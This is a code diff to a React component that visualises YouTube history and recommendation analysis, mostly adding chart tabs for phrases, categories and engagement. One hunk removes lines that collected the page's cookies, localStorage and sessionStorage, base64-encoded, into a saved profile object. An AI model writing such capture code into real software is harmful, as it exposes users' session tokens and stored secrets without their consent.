@@ -1,17 +1,33 @@
 import React, { useState, useEffect } from 'react';
-import { BarChart, Bar, XAxis, YAxis, Tooltip, Legend, ResponsiveContainer } from 'recharts';
+import { BarChart, Bar, XAxis, YAxis, Tooltip, Legend, ResponsiveContainer, PieChart, Pie, Cell } from 'recharts';
 import { Play, History, BrainCircuit, Save } from 'lucide-react';
+
+const COLORS = ['#8B5CF6', '#A78BFA', '#C4B5FD', '#DDD6FE', '#EDE9FE', '#F5F3FF'];
 
 interface AnalysisResults {
   historyVideoCount: number;
   recommendedVideoCount: number;
   topKeywords: { term: string; score: number }[];
-  topChannels: { channel: string; count: number }[];
+  topPhrases: { phrase: string; count: number }[];
+  topChannels: {
+    channel: string;
+    count: number;
+    historyRatio: number;
+    recommendationRatio: number;
+    categories: string[];
+    keywords: string[];
+  }[];
   topVideos: { title: string; url: string }[];
+  categoryDistribution: Record<string, number>;
+  engagementPatterns: {
+    watchTimeDistribution: Record<string, number>;
+    contentTypes: Record<string, number>;
+    peakHours: Record<string, number>;
+  };
   timestamp: number;
 }
 
-type AnalysisTab = 'keywords' | 'channels' | 'videos';
+type AnalysisTab = 'keywords' | 'phrases' | 'channels' | 'videos' | 'categories' | 'engagement';
 
 export function PreTrainingAnalysis() {
   const [results, setResults] = useState<AnalysisResults | null>(null);
@@ -105,9 +121,6 @@ export function PreTrainingAnalysis() {
         blockedChannels: [],
         prioritizedChannels: []
       },
-      cookies: btoa(encodeURIComponent(JSON.stringify(document.cookie))),
-      localStorage: btoa(encodeURIComponent(JSON.stringify(localStorage))),
-      sessionStorage: btoa(encodeURIComponent(JSON.stringify(sessionStorage))),
       createdAt: new Date(),
       lastUsed: new Date(),
       profileStrength: 0,
@@ -203,7 +216,17 @@ export function PreTrainingAnalysis() {
                       : 'text-gray-400 hover:text-white'
                   }`}
                 >
-                  Top Keywords
+                  Keywords
+                </button>
+                <button
+                  onClick={() => setActiveTab('phrases')}
+                  className={`px-4 py-2 text-sm font-medium ${
+                    activeTab === 'phrases'
+                      ? 'border-b-2 border-purple-500 text-white'
+                      : 'text-gray-400 hover:text-white'
+                  }`}
+                >
+                  Phrases
                 </button>
                 <button
                   onClick={() => setActiveTab('channels')}
@@ -213,7 +236,27 @@ export function PreTrainingAnalysis() {
                       : 'text-gray-400 hover:text-white'
                   }`}
                 >
-                  Top Channels
+                  Channels
+                </button>
+                <button
+                  onClick={() => setActiveTab('categories')}
+                  className={`px-4 py-2 text-sm font-medium ${
+                    activeTab === 'categories'
+                      ? 'border-b-2 border-purple-500 text-white'
+                      : 'text-gray-400 hover:text-white'
+                  }`}
+                >
+                  Categories
+                </button>
+                <button
+                  onClick={() => setActiveTab('engagement')}
+                  className={`px-4 py-2 text-sm font-medium ${
+                    activeTab === 'engagement'
+                      ? 'border-b-2 border-purple-500 text-white'
+                      : 'text-gray-400 hover:text-white'
+                  }`}
+                >
+                  Engagement
                 </button>
                 <button
                   onClick={() => setActiveTab('videos')}
@@ -223,7 +266,7 @@ export function PreTrainingAnalysis() {
                       : 'text-gray-400 hover:text-white'
                   }`}
                 >
-                  Top Videos
+                  Videos
                 </button>
               </div>
               <button
@@ -250,28 +293,138 @@ export function PreTrainingAnalysis() {
                   </BarChart>
                 </ResponsiveContainer>
               )}
-              {activeTab === 'channels' && (
+
+              {activeTab === 'phrases' && (
                 <ResponsiveContainer>
-                  <BarChart data={results.topChannels} layout="vertical" margin={{ top: 5, right: 20, left: 20, bottom: 5 }}>
+                  <BarChart data={results.topPhrases} layout="vertical" margin={{ top: 5, right: 20, left: 20, bottom: 5 }}>
                     <XAxis type="number" hide />
-                    <YAxis
-                      dataKey="channel"
-                      type="category"
-                      width={150}
-                      tick={{ fill: '#9CA3AF' }}
-                      axisLine={{ stroke: '#4B5563' }}
-                      tickFormatter={(value) => (value.length > 20 ? `${value.substring(0, 18)}...` : value)}
-                    />
+                    <YAxis dataKey="phrase" type="category" width={150} tick={{ fill: '#9CA3AF' }} axisLine={{ stroke: '#4B5563' }} />
                     <Tooltip
                       cursor={{ fill: 'rgba(139, 92, 246, 0.1)' }}
                       contentStyle={{ backgroundColor: '#1F2937', borderColor: '#4B5563', color: '#E5E7EB' }}
-                      labelStyle={{ color: '#E5E7EB' }}
                     />
                     <Legend wrapperStyle={{ color: '#E5E7EB' }} />
-                    <Bar dataKey="count" name="Video Count" fill="#A78BFA" />
+                    <Bar dataKey="count" name="Occurrences" fill="#A78BFA" />
                   </BarChart>
                 </ResponsiveContainer>
               )}
+
+              {activeTab === 'channels' && (
+                <div className="overflow-y-auto h-full">
+                  <table className="w-full text-sm">
+                    <thead>
+                      <tr className="text-gray-400 border-b border-gray-700">
+                        <th className="text-left py-2">Channel</th>
+                        <th className="text-right py-2">Videos</th>
+                        <th className="text-right py-2">History %</th>
+                        <th className="text-right py-2">Recs %</th>
+                        <th className="text-left py-2">Categories</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      {results.topChannels.map((channel, index) => (
+                        <tr key={index} className="border-b border-gray-700/50">
+                          <td className="py-2 text-white">{channel.channel}</td>
+                          <td className="py-2 text-right text-gray-300">{channel.count}</td>
+                          <td className="py-2 text-right text-gray-300">{Math.round(channel.historyRatio * 100)}%</td>
+                          <td className="py-2 text-right text-gray-300">{Math.round(channel.recommendationRatio * 100)}%</td>
+                          <td className="py-2 text-gray-300">
+                            <div className="flex flex-wrap gap-1">
+                              {channel.categories.map((cat, i) => (
+                                <span key={i} className="px-2 py-0.5 bg-gray-700 rounded text-xs">
+                                  {cat}
+                                </span>
+                              ))}
+                            </div>
+                          </td>
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
+                </div>
+              )}
+
+              {activeTab === 'categories' && (
+                <ResponsiveContainer>
+                  <PieChart>
+                    <Pie
+                      data={Object.entries(results.categoryDistribution).map(([name, value]) => ({
+                        name,
+                        value
+                      }))}
+                      cx="50%"
+                      cy="50%"
+                      outerRadius={150}
+                      fill="#8884d8"
+                      dataKey="value"
+                      label={({ name, percent }) => `${name} ${(percent * 100).toFixed(0)}%`}
+                    >
+                      {Object.entries(results.categoryDistribution).map((entry, index) => (
+                        <Cell key={`cell-${index}`} fill={COLORS[index % COLORS.length]} />
+                      ))}
+                    </Pie>
+                    <Tooltip
+                      contentStyle={{ backgroundColor: '#1F2937', borderColor: '#4B5563', color: '#E5E7EB' }}
+                    />
+                  </PieChart>
+                </ResponsiveContainer>
+              )}
+
+              {activeTab === 'engagement' && (
+                <div className="grid grid-cols-2 gap-4">
+                  <div>
+                    <h4 className="text-sm font-medium text-gray-300 mb-2">Watch Time Distribution</h4>
+                    <ResponsiveContainer width="100%" height={150}>
+                      <BarChart data={Object.entries(results.engagementPatterns.watchTimeDistribution).map(([name, value]) => ({
+                        name,
+                        value: value * 100
+                      }))}>
+                        <XAxis dataKey="name" />
+                        <YAxis />
+                        <Tooltip
+                          contentStyle={{ backgroundColor: '#1F2937', borderColor: '#4B5563', color: '#E5E7EB' }}
+                          formatter={(value) => [`${value}%`, 'Percentage']}
+                        />
+                        <Bar dataKey="value" fill="#8B5CF6" />
+                      </BarChart>
+                    </ResponsiveContainer>
+                  </div>
+                  <div>
+                    <h4 className="text-sm font-medium text-gray-300 mb-2">Content Types</h4>
+                    <ResponsiveContainer width="100%" height={150}>
+                      <BarChart data={Object.entries(results.engagementPatterns.contentTypes).map(([name, value]) => ({
+                        name,
+                        value
+                      }))}>
+                        <XAxis dataKey="name" />
+                        <YAxis />
+                        <Tooltip
+                          contentStyle={{ backgroundColor: '#1F2937', borderColor: '#4B5563', color: '#E5E7EB' }}
+                        />
+                        <Bar dataKey="value" fill="#A78BFA" />
+                      </BarChart>
+                    </ResponsiveContainer>
+                  </div>
+                  <div className="col-span-2">
+                    <h4 className="text-sm font-medium text-gray-300 mb-2">Peak Hours</h4>
+                    <ResponsiveContainer width="100%" height={150}>
+                      <BarChart data={Object.entries(results.engagementPatterns.peakHours).map(([name, value]) => ({
+                        name,
+                        value: value * 100
+                      }))}>
+                        <XAxis dataKey="name" />
+                        <YAxis />
+                        <Tooltip
+                          contentStyle={{ backgroundColor: '#1F2937', borderColor: '#4B5563', color: '#E5E7EB' }}
+                          formatter={(value) => [`${value}%`, 'Percentage']}
+                        />
+                        <Bar dataKey="value" fill="#C4B5FD" />
+                      </BarChart>
+                    </ResponsiveContainer>
+                  </div>
+                </div>
+              )}
+
               {activeTab === 'videos' && (
                 <div className="overflow-y-auto h-full">
                   <ul className="space-y-2">
